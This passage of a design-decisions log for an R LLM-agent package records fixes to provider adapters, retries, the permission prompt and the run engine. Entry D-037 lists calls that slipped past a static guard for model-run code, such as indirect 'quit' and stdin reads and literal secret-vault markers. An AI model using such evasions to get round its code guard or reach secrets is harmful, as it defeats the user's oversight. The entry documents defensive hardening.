   not one string is also malformed now. `NULL` and a list without `decision` stay "no opinion"
   (plan review row 8).
5. **A UI answer that is not a list is not an approval** (`perm_ask()`; 04 section 10.2 row 22, "a
   failing dialog is not an approval"). `"allow"` or `TRUE` made `ans$decision` throw out of
   `perm_check()`; they now deny with "the user declined". Feedback that is not one non-empty
   string is dropped. The request record's `reason`, `suggested_rule` and `undo_note` are one
   string or `NULL` (04 section 7.11), and every `perm_check()` reason is one string.
6. **A nested call's execution events stay paired, and its id is unique** (`nested_execute()`,
   `nested_next_id()`; INFRA-10, IC-53 item 3). An interrupt inside a nested member left its
   `tool_execution_start` without an end. P02's record of executing tools then kept the call, so
   `gptr_register()`'s unregister closure and the other control exports refused with
   `gptr_error_permission` after the run (observed as teardown errors in the red run). The end is
   now emitted from `on.exit()` before the outer call's end. The plan's id `<outer>/<k>` used the
   number of the 20 kept records, so calls after the 20th all got `<outer>/21`; the count is now
   kept per outer call in `run$nested_seq`.
7. **The frozen schema memo is keyed on the frozen tool array** (`tool_frozen()`, IC-68). The plan
   cached the parsed schemas at the first call, even before the first freeze (an empty table) and
   across a refreeze, so a tool whose `parameters` is a function was then never validated, or was
   validated against a stale schema.
8. **Input fields are matched exactly** (`[[` for `INVALID_JSON`, `code`, `path`, `questions`,
   `question`). `$` matched by prefix, so a tool input `code_path` was shown and classified as `r`
   code, and `INVALID_JSON_note` failed validation. A nested member listed with a non-numeric level
   by the outer analysis passes the gate (`nested_listed_level()`); the plan's `max(NA)` threw an
   unclassed error inside the model's code.
9. **An interrupt anywhere in a call is recorded** (`dispatch_call()`, `tool_interrupted()`;
   INFRA-10, 03 sections 6.2, 6.3 and 6.8.3, loop check L19). The plan recorded an interrupt only
   while the tool's `execute()` ran (`tool_execute_frame()`'s `on.exit()`). Ctrl-C at the permission
   prompt (which aborts the run), or an interrupt in a policy, a classifier, a hook or a
   checkpointer, unwound with no tool-result message and no `tool_execution_end`, so P02's record
   of executing tools kept the call until `agent_end`. Each call now has its own frame whose
   `on.exit()` records the error result and the end event: "Interrupted after <s> s; side effects
   may have occurred." once `execute()` has started, else the new text "Interrupted before the
   tool ran; the call was not executed.". The interrupt is still never handled (no
   `tryCatch(interrupt =)`; G3). A calling `error` handler only notes an error that escapes the
   call (a failing store), which still ends the run and is not recorded a second time; the append
   and its mark run inside `suspendInterrupts()`. The one-shot control tokens end with the call
   even when it ends before `execute()`.
10. **Tool results are normalised, and must be recordable** (`tool_result_check()`,
    `tool_result_message()`, `dispatch_record()`). The names of the content list are dropped: P02's
    `gptr_tool_result()` keeps those of a named `images` list, which item 3's check refused and the
    transcript would write as a JSON object. `usage` must be `NULL` or a list (`msg_tool_result()`
    threw). The tool-result message is encoded as the store encodes it before it is appended, so
    `details` holding an environment or a function (from the tool, or from a `tool_result` hook's
    patch, which P02 accepts as a named list) become the error result "The result of <name> cannot
    be recorded in the transcript: <message>" instead of a store failure that ends the run.

Validation: `progress/P06.md`, Task 7. With the plan-literal source, every added test block fails
(`dev/.validation/P06/task7-added-red-isolated3.log`; the nested-id repetition is shown on its
own in `task7-nested-ids-literal.log`). Items 9 and 10 (review round 1): the four new blocks fail
against the round-0 source (`task7-fix1-red.log`, `task7-fix1-red-isolated.log`).

## D-031 - P12 Responses normaliser: IC-74 usage, typed status and error codes, items found by id (2026-10-04)

P12 Task 6's plan-literal `responses_normaliser()` (`R/provider-openai-responses.R`, the `parse`
of the `openai-responses` adapter) was changed in the four ways below. Task 7 (the request
builder and `builtin:openai`), P06's usage rows and P24 consume it.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-022, D-027).
   The plan read every usage field with `%||% 0`, so a reported null became a known zero.
   `responses_usage()` now follows D-027's rule with Task 4's helpers (`completions_count()`,
   `completions_first()`): a field left out keeps P05's legacy zero, a reported null (or a value
   that is not a nonnegative number) is `NA`, and `"usage": null` is no report. Usage that
   `response.failed` reports is recorded on the error's partial message; the plan dropped it. The
   hand-written goldens of `failed` and `truncated` (no usage on the wire) record unknown usage
   (`g_usage_unknown()`, as D-027 point 2 requires); the plan wrote zeros, which the D-022 core
   no longer produces.
2. **Contract-typed status and codes** (04 sections 2.2, 4.2; D-022 point 3). A `status`,
   `incomplete_details.reason` or error `code` that is not one string is never used as text
   (`responses_str()`): the plan built `raw_stop_reason` `"7.max_output_tokens"` from a numeric
   status, classified `list("server_error")` as a retryable overload and threw on a vector code.
   A terminal response without a `status` takes it from its event (`response.completed` is
   `completed`, so `stop`; the plan gave `error`), as Pi's `mapStopReason()` does.
3. **Every error shape is read** (08 section 3.3). An SSE `event: error` whose data has no `type`,
   and a `data` object with only an `error` member, are error events (the plan ignored them and
   later reported a truncated stream); an error given as a bare string is the provider's message
   (the plan's `err$code` threw, giving an `internal` error).
4. **Items found by `item_id`, then `output_index`; malformed items stay harmless.** Stream fields
   are read with `[[`. A delta that carries only `item_id` reaches its item (the plan's
   `as.character(NULL)` key threw), an item that is not an object is ignored, a message item
   without an id gets no signature (the plan wrote `{"v":1,"id":null}`), a done item without
   `phase` keeps the phase of the added item, a function call without an `fc_` id keeps its call
   id alone (the plan gave `call_z|`), and an empty summary or content list no longer blanks
   streamed text.

Validation: `progress/P12.md`, Task 6. The plan's six tests pass against the plan-literal source;
the eight added tests fail 18 assertions there (2 null usages read as zero, the failed usage lost,
the list code classified, the vector code throwing, the typeless SSE error, 2 for the bare-string
error, 3 statuses, 2 for the `item_id` delta, 3 for the non-object item, 1 for `call_z|`, and the
blanked thinking and text of empty done lists).

## D-032 - P12 Responses request bodies: compat and headers from the resolved record, tools only where the model calls tools, signatures read by exact field (2026-10-04)

P12 Task 7's plan-literal `responses_build()` and `responses_assistant()`
(`R/provider-openai-responses.R`, the `build()` of the `openai-responses` adapter) were changed in
three ways. P07's `request_build()`, P06's runs and P24 consume the bodies.

1. **Compat and headers from the provider record `provider_stream()` resolved** (D-023 items 1 and
   3 and D-027 item 3, which required this of Task 7). The plan's `compat_flags(model$provider,
   model)` and `c(headers, adp_provider_headers(model))` looked the provider up globally, so a
   session-scoped provider (`model = <spec>`, 04 section 10.1) lost its `compat` (the explicit
   cache mode: `prompt_cache_options` and the explicit breakpoints) and its headers, a session
   record shadowing `openai` could not switch the explicit mode off (plan ambiguity 13), and a
   record header with the name of an adapter header was sent twice, which P04's `http_headers()`
   refuses. Now `compat_flags(adp_provider_record(model, opts) %||% list(id = <provider>),
   model)` and `adp_merge_headers(..., auth = "authorization")`.
2. **Tools only for a model that calls tools; `tool_choice` only with a tools array**
   (07-local-ollama.md section 1, IC-74: tool calling is "enabled only when the selected model
   supports" it; D-029 items 1 and 2 for this adapter). A model record with `tool_call = FALSE`
   gets no `tools`, no `tool_choice` and no `additional_tools` item (operator text is still sent as
   a developer message, and the history's calls and results are still sent); a request without a
   tools array sends no `tool_choice` (a forced choice would name an undeclared tool). The plan
   sent all three whatever the model's tool calling and the tools. Reach as in D-029.1: the
   catalog's `openai` models all declare `tool_call = TRUE`; a user or plugin `gptr_provider()`
   model on this api must declare it.
3. **Text signatures are read by exact field.** The plan's `sig$id` partial-matched another key
   (`{"identifier":"msg_x"}` became a message item with id `msg_x`) and threw for a signature that
   parses to a JSON scalar, so `build()` failed for that session. `responses_text_signature()` takes
   the id and `phase` only when each is one string; otherwise the block replays as plain assistant
   text, and a phase that is not one string is left out.

Validation: `progress/P12.md`, Task 7. The plan's tests pass unchanged (the default cache-policy
and INFRA-25 run tests skip until P07, and P06 with P07, are loaded); against the plan-literal
source the three added tests fail 15 assertions (8 for the resolved record, 5 for tools and
`tool_choice`, 2 for the signature); mutations that append the record headers or send
`tool_choice` without tools fail 1 and 3 assertions. `gptr_check()` on the adapter: 31 checks, 0
failed.

## D-033 - P06 recovery classification: unknown or estimated usage proves no overflow, overflows and gptr's own failures are never retried, malformed records never throw (2026-10-04)

P06 Task 8's plan-literal `is_context_overflow()`, `run_retryable()`, `err_class()`,
`retryable_error_text()` and `agent_retry_delay()` (`R/agent-run.R`) were changed in four ways.
Task 10's run engine (`run_response()`, `run_response_error()`, `run_condition()`) consumes them.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-021, D-022,
   D-024, D-025). The plan's silent-overflow rule added `usage$input %||% 0` and
   `usage$cache_read %||% 0`. An unknown count (P05's `usage_as(NULL)` for an unreported usage,
   D-022's `NA` for a reported null) made the sum `NA`, and the `if` then stopped with base R's
   unclassed "missing value where TRUE/FALSE needed" on every `stop` response of such a model; in
   Task 10's `run_response()` that error would end the run. The known prompt counts (`input`,
   `cache_read`) are now a lower bound: a field the usage leaves out keeps P05's legacy zero, and
   an unknown value (`NA`, or an explicit null such as a `json_decode()`d `"output": null`, the
   distinction P05's `usage_from_json()` makes; the plan's `%||% 0` read that null as zero) or one
   that is not a nonnegative number adds nothing. The rule therefore
   proves an overflow only when the known counts alone exceed the window (a `stop`) or reach 99%
   of it with a known zero output (a `length` stop); an unknown output never counts as zero. A
   usage marked `estimated = TRUE` (Task 10 replaces an unreported usage with gptr's own estimate
   before the check) proves nothing: Pi detects a silent overflow only from reported usage, and an
   estimate above the window would otherwise start a compaction on a guess.
2. **An overflow is never retried.** `run_retryable()` returns `FALSE` whenever
   `is_context_overflow(msg, NULL, err)` holds (Pi's `_isRetryableError()`; the plan's own
   interface line says "never an overflow"). The plan checked only the record's class, so a 429 or
   5xx whose text is an overflow ("429 too many tokens in the prompt") was retryable. Task 10's
   engine tests the overflow first, so its behaviour is unchanged; a direct caller now gets the
   same answer.
3. **gptr's own definitive failures are never retried.** P05's `provider_stream()` turns a gptr
   condition raised in its driver into an `error` event whose record carries the condition's
   class. For `no_key`, `not_available`, `untrusted`, `invalid_argument`, `invalid_spec` and
   `missing_package` the message is gptr's text, not a provider's, so the plan's fallback to the
   provider text patterns could retry a missing credential or an invalid argument twice (for
   example "`timeout` must be a number" matches `timeout`). These classes now give `FALSE`, like
   `auth` and `spend_cap`. `internal` keeps the text rule (P05's "The stream ended without a
   terminal event." is retried, as in report 02). `provider_classes()` is unchanged: such a
   failure is stored as `gptr_error_provider` with `error_type` naming the class (plan).
4. **The classifier never throws.** Fields are read with `[[` and checked for shape. A message that
   is not a list, an `error_message` that is not one string, a usage that is not a list, a count
   that is not one nonnegative number, a window that is not one positive finite number, an error
   record that is not a list, an `NA` or empty class and a status that is not one number give
   `FALSE`, `NA` or `"provider"`. The plan threw on several of them (`$` on an atomic vector,
   `'length = 2' in coercion to 'logical(1)'`, a character count) and returned the class `""`.
   `agent_retry_delay(attempt)` refuses an attempt that is not a whole number >= 1 with
   `gptr_error_invalid_argument` (as P04's `retry_backoff()`); the plan returned `numeric(0)`,
   `NA`, 2 or 4 for `0L`, `"1"`, `1.5` and `NULL`. Attempts of 3 and more still give 4 s.

Validation: `progress/P06.md`, Task 8 (`test-agent-run.R`). The plan's 18 tests pass against the
plan-literal source; the 7 added blocks fail 18 assertions there (the `if (NA)` error, 2
estimated usages, the non-list message, 2 retried overflows, 6 retried definitive classes and 6
accepted `agent_retry_delay()` arguments), and a probe of the plan-literal functions
(`dev/.validation/P06/task8-literal-probe.log`) shows the remaining throws of item 4.

## D-034 - P12 Gemini normaliser: IC-74 usage, typed finish reasons and error fields, malformed parts never end the stream (2026-10-04)

P12 Task 8's plan-literal `google_normaliser()` and `google_error_info()`
(`R/provider-google.R`, the `parse` of the `google-generative-ai` adapter) were changed in the four
ways below. Task 9 (the request builder and `builtin:google`), P06's usage rows and P24 consume
them.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-022, D-027,
   D-031). The plan read `cachedContentTokenCount` and `thoughtsTokenCount` with `%||% 0`, so a
   reported null became a known zero. `google_usage()` now follows D-027's rule with Task 4's
   helpers (`completions_count()`, `completions_first()`): a field left out keeps P05's legacy
   zero, a reported null (or a value that is not a nonnegative number) is `NA`, and
   `"usageMetadata": null` is no report; each report still replaces the last (Pi). The
   hand-written goldens of `unknown_finish` and `truncated` (no usage on the wire) record unknown
   usage (`g_usage_unknown()`, as D-027 point 2 requires); the plan wrote zeros, which the D-022
   core no longer produces even with the plan-literal source.
2. **Contract-typed finish reasons** (04 section 4.2; D-022 point 3). A `finishReason` that is
   not one string is an `error` stop, never matched as text: the plan's `fr == "STOP"` mapped
   `["STOP"]` to `stop` and stored a numeric reason as an integer `raw_stop_reason`.
   `raw_stop_reason` is text (`adp_chr()`), the error message names it (`unknown` when it has no
   text) and appends `finishMessage` only when that is one string.
3. **Typed error fields; every error shape read** (09 section 2.1; D-031 point 3). An error chunk
   whose `error` is a bare string is a provider error with that text (the plan's `err$status`
   threw, giving an `internal` error), a `code` is used only when it is one whole number from 100
   to 599, an HTTP status (a vector code threw "'length = 2' in coercion to 'logical(1)'", and,
   found in review round 1, a code beyond R's integer range such as `1e10` escaped `push()` as
   the warning "NAs introduced by coercion to integer range", against 04 section 8.1's "Normalisers
   never signal R conditions"), and a `status` only when it is one string (the plan matched
   `list("UNAVAILABLE")` as a retryable overload).
4. **Malformed parts never end the stream.** Chunk fields are read with `[[` (no `$` partial
   matching). A part, `functionCall`, candidate or `content` that is not an object is ignored, and
   a text part counts only when `text` is one string (the plan threw "subscript out of bounds" or
   "$ operator is invalid for atomic vectors", ending the stream with an `internal` error, or
   joined a number into the text). A thought signature is kept only when it is one string (a
   non-string signature made the block constructors throw when the block closed). A call without
   a name gets a generated id with the prefix `call` (its block name is the core's
   `unknown_tool`), and a response id with no alphanumeric character gives the id fragment `x`.
   A generated id `<name>_<fragment>_<n>` moves on to the next free `n` when a call of the same
   message already holds it (review round 1: the plan could repeat a provider-supplied id such as
   `read_abc_2`, and duplicate ids in one assistant message break tool-result pairing).

Validation: `progress/P12.md`, Task 8. The plan's six tests pass against the plan-literal source
(56 assertions, the plan's count, with the adapted goldens); the four added tests for these
points fail 13 assertions there (2 null usages read as zero, 4 for the numeric and list finish
reasons, 2 for the non-string signature, 1 error for the bare-string `google_error_info()` call,
4 for the non-object parts), and an ad hoc probe of the plan-literal source
(`dev/.validation/P12/task8-adapt-red2.log`) shows the remaining throws of point 3. Review round 1
added the HTTP-range code rule of point 3 and the free-id rule of point 4, each with a regression
test that failed before the fix (`task8-fix1-red.log`: 8 failures and 1 warning).

## D-035 - P12 Gemini request bodies: headers from the resolved record, tools only where the model calls tools, image notes in the tool output (2026-10-04)

P12 Task 9's plan-literal `google_build()` and `google_tool_results()` (`R/provider-google.R`, the
`build()` of the `google-generative-ai` adapter registered by `builtin:google`) were changed in
three ways. P07's `request_build()`, P06's runs and P24 consume the bodies.

1. **Provider headers from the record `provider_stream()` resolved, merged by name** (D-023 items 1
   and 3, which required this of Task 9 with the credential header `x-goog-api-key`). The plan's
   `c(headers, adp_provider_headers(model))` looked the provider up globally, so a session-scoped
   provider (`model = <spec>`, 04 section 10.1) lost its non-secret headers (04 section 10.2 row 1),
   and a record header with the name of an adapter header (`Content-Type`, `X-Goog-Api-Key`) was
   sent twice, which P04's `http_headers()` refuses, so the request never left the process. Now
   `adp_merge_headers(headers, adp_provider_headers(model, opts), auth = "x-goog-api-key")`: the
   adapter's headers and key win, and a record's own key header is sent only when the adapter
   sends none.
2. **Tools only for a model that calls tools** (07-local-ollama.md section 1, IC-74: tool calling
   is "enabled only when the selected model supports" it; D-029.1 and D-032.2 for this adapter). A
   model record with `tool_call = FALSE` gets no `tools` and no `toolConfig`; the history's
   `functionCall` and `functionResponse` parts are still sent. The plan sent both whatever the
   model's tool calling (it already sent `toolConfig` only with a tools array). Reach as in
   D-029.1: the catalog's `google` model (`gemini-3.8-flash`) declares `tool_call = TRUE`; a user
   or plugin `gptr_provider()` model on this api must declare it.
3. **Tool-result images for a model without image input** (D-023 item 4 and D-029.3 for this
   adapter). Each image becomes the omission note "(image omitted: this model does not accept
   images)" in the result's own `functionResponse.response` text, after the text, once per image;
   no image content follows. The plan sent, on Gemini 3 and 2.5 alike, an extra user content
   "Tool result image:" followed only by the note (announcing an image that is not attached), and
   an empty `output` for an image-only result. With image input the plan's behaviour is unchanged
   (`functionResponse.parts` on Gemini 3, the following "Tool result image:" content on 2.5).

Validation: `progress/P12.md`, Task 9. The plan's ten tests pass against the plan-literal source
(the default cache-policy test skips until P07 registers the `default` policy); against the
plan-literal source the added tests fail 13 assertions (3 for the resolved record, 2 for tools
sent to a model without tool calling, 8 for the image notes); mutations of the final source that
append the record headers with `c()` or drop the `tool_call` gate fail 3 and 2 assertions.
`gptr_check()` on the adapter: 30 checks, 0 failed.

## D-036 - P06 request shaping: unusable router answers fall back, switches are counted per branch, no chat on decision models, colon model ids, IC-74 context estimates (2026-10-04)

P06 Task 9's plan-literal request shaping in `R/agent-run.R` (`run_target()`, `run_route()`,
`run_model_resolve()`, `freeze_fallback()`, `images_elide()`, `context_tokens()`,
`run_estimator_update()`, `plugin_state_persist()`, `run_returns()`, `run_build()`,
`request_fallback()`) was changed in the eight ways below. Task 10's run engine
(`run_request()`, `run_compact_check()`, `run_response()`, `run_settle()`) and Task 15's
`ctx$set_model()` consume these functions.

1. **An unusable router answer falls back** (IC-69: P06 calls the router "falling back to the
   default model with a diagnostic"; 04 section 10.2, kind table row 4 `router`: "a timeout, an
   error or a non-registered result falls back to the default model with a diagnostic and a
   `route` event"; IC-74). Item 2 says when the `route` event is emitted. The plan fell back only
   when the `router.call` service threw. An answer that named a model that does not resolve ended
   the run with `gptr_error_unknown_model`. An answer without a model string (`list(model = 42)`)
   ended it with `gptr_error_invalid_argument` from `model_resolve()`. A decision-only
   (classifier) model was accepted and reached `provider_stream()`, which refuses it (D-017), and
   that ended the run. Now `route_answer()` treats all three as unusable. Each one gets a
   `router_fallback` diagnostic and the default chat model (`model_default("chat")`). A default
   that is itself decision-only is refused with `gptr_error_not_available` before anything is
   appended. The fallback keeps the router's last state, from the branch's last `gptr.router`
   entry, as P08's `router_fallback()` does. A router state that is not JSON is dropped with a
   `router_state` diagnostic. Under the plan, `session_append()` failed with "the session store
   failed" and the run ended.
2. **A switch is counted against the branch, not the run** (IC-69 "each switch appends
   `model_change` ... and emits `route`"). The plan compared against `run$routed`, which is `NULL`
   at the start of every run. So every new run on a routed session appended `model_change` and
   `gptr.router` and emitted `route` again, even when the router chose the same model. That is a
   spurious switch and a stated cache miss. The baseline is now the model of the branch's last
   `model_change` entry (`path_model_ref()`), so a switch is recorded only when the model changes.
   P08's `router_call()` reads the branch's last `gptr.router` entry the same way.
   - Fallbacks follow the same rule. A fallback that changes the branch's model is a switch: it
     appends `model_change` and `gptr.router` and emits `route`. A repeated fallback to the same
     default gets its `router_fallback` diagnostic but no `route`. This differs from the literal
     words of 04 section 10.2 row 4 ("with a diagnostic and a `route` event"). IC-69 (section 15,
     which wins over section 10.2) ties `route` to a switch: "Each switch appends `model_change`
     ... and emits `route`". P08's `router_fallback()` follows IC-69 as well: it hands the fallback
     to P06 as an ordinary answer and leaves "the `route` event and the
     `model_change`/`gptr.router` entries of the switch" to `run_route()`. Once P08 is loaded, P06
     cannot tell P08's fallbacks from router choices, so a `route` per fallback could be emitted
     only for the fallbacks P06 detects itself. The plan also emitted no `route` for a repeated
     fallback within a run (`run$routed`); this change extends that to later runs.
3. **No chat request on a decision-only model** (IC-74; the coordinator's note; D-017, D-028).
   `run_target()` calls P05's `stream_chat_model()` on the resolved session model before any
   request is built. The plan returned the classifier record, and the refusal came only inside
   `provider_stream()`, after the budget check, the ledger row and `before_request`. The condition
   is the same (`gptr_error_not_available`). Router answers follow item 1.
4. **Model ids may hold a colon** (IC-74: local Ollama tags such as `qwen3:8b`). For a
   session-registered provider (`model = <spec:provider>`, ambiguity 21), the plan stripped any
   `:<suffix>` as a thinking level. So `loc/qwen3:8b` looked for model `qwen3` and failed, and
   `loc/m1:8b` silently resolved to `m1`. `run_model_resolve()` now tries the whole id first. It
   reads a suffix as thinking only when the suffix is one of P05's `catalog_thinking_levels`, which
   is P05's own `model_lookup()` rule. Otherwise the strict `gptr_error_unknown_model` applies.
5. **Thinking levels are clamped** to the model's levels with P05's `model_clamp_thinking()`. This
   applies to a router's `thinking`, a pending `ctx$set_model()` switch and the session's level.
   The plan passed any string through, for example `max` to a model whose highest level is `high`.
6. **The fallback freeze is a freeze** (04 section 9.1: `parameters` "a function is evaluated once
   at freeze"; `available` "evaluated at session freeze; `FALSE` excludes a direct tool"). The plan
   wrote `{}` as the schema of a tool whose `parameters` is a function. Task 7's `tool_frozen()`
   then validated against `{}`. The plan also ignored `available()`. `freeze_tool_decl()` now
   evaluates both with the session's ctx. A tool whose `available()` is not `TRUE` is left out. A
   tool whose `available()` or `parameters()` throws, or whose schema is not an object schema, is
   left out with a `tool_left_out` diagnostic.
7. **Images are elided by id** (IC-67: newly elided images are "recorded by an appended
   `gptr.image_elision` entry (one stated cache break)"). The plan elided one image block at a time.
   When one copy of a repeated image was enough to get under the limit, the next request elided
   every copy, because elision is keyed on the id. That changed the projection with no new entry,
   which is an unstated cache break. Now every copy of an elided id goes at once.
8. **IC-74 context estimates** (07-local-ollama.md section 5 "Missing usage remains unknown"; 03
   section 12.5 "the last provider-reported input total + output + `m * est(new entries)`"). The
   plan took any non-`NULL` `usage$total` as the anchor. An unknown total (`NA`, from
   `usage_as(NULL)` or a reported null) made `context_tokens()` `NA`, which Task 10's
   `compact.should` call and its S25 check (`is.finite()`) cannot take. gptr's own estimate
   (`estimated = TRUE`, Task 10's stand-in for an unreported usage) was taken as if the provider had
   reported it. Now only a finite provider-reported total is an anchor; without one, the estimate
   covers everything.
   - After a compaction the plan counted only the compaction's blocks and what followed. It
     dropped the kept tail, which P05's `entry_compaction_cut()` projects (S33), and the frozen
     prompt. Both are counted now.
   - Estimates count text, context and thinking blocks as prose, tool-call arguments as JSON and
     images with `est_image_tokens()` at the block's size, else at `gptr$plot()`'s 1000 x 700
     default (`msg_tokens_est()`). The plan's `msg_text()` dropped context blocks, tool calls and
     images. `request_fallback()` uses the same estimate.
   - An image elided on the path (IC-67) counts as its `[image omitted: ...]` text, which is what
     the request sends. `request_fallback()` therefore elides before it estimates (the plan
     estimated first and elided afterwards in `run_build()`), and `context_tokens()` passes the
     path's elided ids to the estimate. Otherwise every elided image would have been counted at
     full size in `tokens_est`, the ledger row, `before_request`, the estimator multiplier and the
     context projection.
   - `run_estimator_update()` also changed. The plan summed the prompt counts with `unlist()`,
     and an unknown count stopped it with base R's unclassed "missing value where TRUE/FALSE
     needed". An unknown count now leaves the multiplier unchanged; a count the usage leaves out is
     P05's legacy zero.

Two smaller changes:

- `plugin_state_persist()` persists a state emptied after it was persisted as `{}`. Under the plan
  nothing was written, so a resume restored the old state.
- `run_returns()` reports a `returns` schema that `schema_validate()` cannot apply as the same
  notice. The plan threw from settlement.

Validation: `progress/P06.md`, Task 9 (`test-agent-run.R`). The plan's 15 tests pass against the
plan-literal source. All 11 added blocks fail there, with 23 failed expectations
(`dev/.validation/P06/task9-literal-final.log`). The router fallback block stops at its third
answer, so a probe of the plan-literal `run_route()` (`task9-literal-probe.log`) shows the rest:
a classifier answer is accepted, `list(model = 42)` raises `gptr_error_invalid_argument`, and a
non-JSON state raises `gptr_error_internal` ("the session store failed").

## D-037 - P09 static guard: namespaced indirect calls, function arguments, stdin readers and every secret marker are checked, parseable code never makes the guard throw (2026-10-04)

P09 Task 1's plan-literal `eval_guard()`, `eval_assign_targets()` and `gptr_shim()`
(`R/eval-guard.R`) were changed in the five ways below. Task 8's `eval_run()` calls all three
without a handler, and P18's server `r` also uses the guard. Points 3-5 and the later items of
point 2 came from the first review round.

1. **Namespaced heads are checked like bare ones** (IC-67: `q`/`quit` "in any position (as a value,
   a `FUN` argument, inside `match.fun`, `get`, `do.call`, `base::`)"; 04 section 7.9 stdin
   readers). The plan set the call name only for a symbol head, so the indirect-string and stdin
   checks never saw a `pkg::fun(...)` call. `base::do.call("q", list())`,
   `base::match.fun("quit")()`, `base::get("q")()`, `base::readLines("stdin")` and
   `base::scan()` passed the guard and would end or hang the user's session. `pkg::name` is still
   always refused, and the name now also drives those checks. As a side effect
   `base::quote(q())` is no longer flagged, the same as the bare `quote(q())` the plan already
   exempts.
2. **No parseable input makes the guard or the targets throw** (04 section 2.2 and 7.9: evaluation
   failures never throw, they become events and a status). The plan's walkers indexed `e[[2L]]`
   and `e[[3L]]` without a length check, and `scan()`'s file argument without a missing check.
   `` `=`() ``, `` `for`() ``, `` `function`(x) ``, `` `$`() `` and `scan(, what = "a")` raised
   "subscript out of bounds" or 'argument "file_arg" is missing'.
   - An empty file argument now means scan()'s default `""`, which is standard input, so
     `scan(, what = "a")` is refused as a stdin read.
   - A `function` head counts as a definition only with a pairlist of formals and a body.
   - `eval_guard_target_root()` returns `NULL` for an empty argument, so `setkey(, id)` and
     `f(, 1)[1] = 2` no longer add a `""` target.
   - An assignment with an empty right-hand side (`` `=`(x, ) ``) defines nothing; the plan's
     `eval_guard_fun_defs()` raised 'argument "rhs" is missing'.
   - `assign()`, `for` and target roots never yield an `NA` or `""` name
     (`setkey(NA_character_, id)` gave `NA`).
   - `gptr_shim()` rewrites only top-level calls. The plan assigned every rewritten element back,
     and assigning a top-level `NULL` deletes it: `x = 1; NULL` lost an expression (its `srcref`
     no longer lined up), and `NULL; gptr("a")` raised "subscript out of bounds".
3. **Every literal secret marker is refused** (04 section 7.9 and 03 section 6.5: "a literal
   `[secret:` marker"). The plan matched only `[secret:[A-Za-z0-9_.-]+]`, but the vault's own
   names include `auth:<key>` and `auth:<key>:<field>` (`auth_secret_name()`), and
   `secret_name_ok()` allows `/`, `@` and `+`. So `[secret:auth:openai]` passed. The guard now
   uses the redactor's marker grammar (`R/auth-redact.R`). A `[secret:` that opens no complete
   marker is refused as `"[secret:"` with a plain `Sys.getenv()` hint, as `secret_scan()` does.
   Strings that are not valid UTF-8 are matched bytewise, without a warning.
4. **Stdin readers are found by argument, as R matches it.** The plan looked only at the first
   argument, and only of `readLines`, `readline`, `file`, `scan`, `source`, `read.table` and
   `read.csv`. The guard now resolves the connection argument with `match.call()` against the
   base or utils definition, so names, partial names and positions all count. It never evaluates
   anything. `readLines()` without a connection reads `stdin()`, as does its default. `parse()`
   joins `scan()`: with no `text`, the file `""` (the default) is the console. `readBin`,
   `readChar`, `read.csv2`, `read.delim` and `read.delim2` are added for `"stdin"`. A call that
   passes `...`, or that R would refuse (unused or ambiguous names), is not flagged.
   `readline` is no longer counted as a reader, since its argument is a prompt; it stays blocked
   as a call.
5. **`q`/`quit` as the function argument, and quoted names after `::`** (IC-67: "a `FUN`
   argument", "`base::`"). `match.fun()` looks a non-function value up by name, so
   `q = 1; sapply("no", q)` calls `base::q()`. The plan exempted it because the code assigns `q`.
   As the function argument (`what`, `FUN` or `f`, resolved by `match.call()`) of `do.call`,
   `match.fun`, the apply family, `Map`, `Reduce`, `Filter`, `Find` and `Position`, `q`/`quit` is
   now exempt only when the code defines a function of that name. Other arguments keep the value
   rule, so `q = quantile(x); sapply(q, round)` passes. R also accepts `base::"q"`, which the
   plan's symbol-only `::` check missed; a length-1 string name now counts like a symbol.

Known limit, unchanged: the walkers recurse once per nesting level. A 2,000-term `x + x + ...`
hits R's node stack in the walk even though R can evaluate it (measured with the sourced file:
1,000 terms pass, 2,000 overflow). That is an error before anything is evaluated, so it fails
closed.

Validation: `progress/P09.md`, Task 1 (`test-eval-guard.R`). The plan's 52 expectations pass
unchanged. The first two added blocks fail against the plan-literal source: 4 failures, then an
error at `scan(, what = 'a')` (`dev/.validation/P09/task1-red-adaptations.log`). A probe of the
plan-literal source gets 9 errors on odd calls; the adapted source gets 0
(`task1-probe-plan-literal.log`, `task1-probe-adapted.log`). Review round 1: the new
expectations failed before the fixes, `[ FAIL 19 | WARN 0 | SKIP 0 | PASS 78 ]`, then
`[ FAIL 2 | WARN 0 | SKIP 0 | PASS 120 ]` for the shim and `NA` cases
(`task1-fix1-red.log`, `task1-fix1-red2.log`). Green is 126. A fuzz of 70,000 parseable inputs
(two seeds) gives 0 errors and 0 warnings from the guard, the targets and the shim
(`task1-fix1-fuzz.log`, script `task1-fix1-fuzz.R`).

## D-038 - P06 run engine: a reported usage keeps its unknowns, nested pumps run only the awaited runs' tools, a failed stream redactor never ends the run, settlement survives a store failure (2026-10-04)

P06 Task 10's literal engine (`R/agent-run.R`) predates IC-74, departs from IC-57 and D-010, and
could leave a session `running` (04 section 7.6: `session_run()` runs to settlement). Six places
changed. The behaviours now, which P07 (compaction), P08 (`gateway_signal()`), P13, P14, P19
and P21 consume:

1. **The estimator fills a usage only when the provider reported nothing** (07-local-ollama.md
   section 5, "Missing usage remains unknown"; contract 4.3 `estimated`). The plan replaced the
   message's usage with `usage_new(input = <request estimate>, output = <text estimate>,
   estimated = TRUE)` whenever `input + output` was not a known positive number. A usage with a
   reported input and an unknown output, or a reported cache read beside zero input and output,
   therefore lost its observation. `run_usage_reported()` now decides. The estimator fills the row
   only when the record is missing, is refused by P05's `usage_as()`, or holds no known positive
   count among `input`, `output`, `cache_read`, `cache_write_5m` and `cache_write_1h`. That covers
   an all-unknown record (P05's `usage_as(NULL)`, which P12's normalisers give for a stream that
   reported nothing) and one with only legacy zeros. A partial report is kept as reported: its
   unknown counts stay `NA` in the stored message, the usage row and the session totals (D-021),
   and budgets compare its known part (D-025). The ledger's cache flags read the cache read of
   the normalised record (`usage_as()`): an omitted field is P05's legacy zero, an unknown one
   `NA` (D-024 item 2).
2. **An overflow condition's `tokens` is the provider's count.** `gptr_error_context_overflow`
   carried `msg$usage$input`. For an overflow without reported usage (the usual case: the error
   arrives before any usage) that was gptr's own estimate presented as a measurement. It is now
   the provider-reported input count, else `NA` (`run_overflow_tokens()`).
3. **A nested pump runs only the FIFO tools of the runs it awaits** (IC-57; P04's
   `reactor_pump()` default). The plan's `run_wait()` and foreground wait passed
